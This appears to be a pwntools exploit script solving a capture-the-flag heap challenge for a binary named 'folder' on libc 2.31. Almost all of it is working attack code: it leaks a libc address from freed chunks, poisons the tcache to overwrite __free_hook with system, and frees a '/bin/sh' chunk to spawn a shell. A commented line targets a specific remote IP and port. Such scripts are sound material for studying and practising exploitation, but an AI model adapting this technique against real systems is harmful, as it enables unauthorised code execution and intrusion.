from pwn import *
context.log_level = 'debug'
prog = './folder'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.31.so")
#p = remote("18.163.177.225", 20000)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()
    	
def new1(idx, size, content='a'):
	p.sendlineafter(">>>", '1')
	p.sendlineafter("idx:", str(idx))
	p.sendlineafter("size:", str(size))
	p.sendlineafter("name:", content)
def new2(idx, size, content='a'):
	p.sendlineafter(">>>", '2')
	p.sendlineafter("idx:", str(idx))
	p.sendlineafter("size:", str(size))
	if size >= 0:
		p.sendlineafter("file:", content)
def add(idx1, idx2):
	p.sendlineafter(">>>", '3')
	p.sendlineafter("folder idx:", str(idx1))
	p.sendlineafter("file idx:", str(idx2))
def free(idx):
	p.sendlineafter(">>>", '4')
	p.sendlineafter("idx:", str(idx))
def show(idx):
	p.sendlineafter(">>>", '5')
	p.sendlineafter("idx:", str(idx))
def exp():
	for i in range(10):
		new2(i, 0xa0)
	for i in range(8):
		free(i)
	for i in range(7):
		new2(i, 0xa0)
	
	new2(10, 0x70)
	#dbg()
	new1(0, 0x20)
	new1(1, 0x20)
	add(0, 9)
	show(0)
	p.recv(12)
	libc.address = u64(p.recv(6)+'\x00'*2)-0x00007fcc64b6cc61+0x7fcc64981000
	log.info("libc.address ==> " + hex(libc.address))
	
	for i in range(8):
		free(i)
	free(9)
	add(1, 20)
	new2(0, 0xa0)
	add(1, 20)
	new2(11, 0x100, '/bin/sh\x00'+'a'*0xa0+p64(0xb0)+p64(libc.sym['__free_hook']))
	new2(12, 0xa8)
	new2(13, 0xa8, p64(libc.sym['system']))
	free(11)
	p.interactive()
if __name__ == '__main__':
	exp()
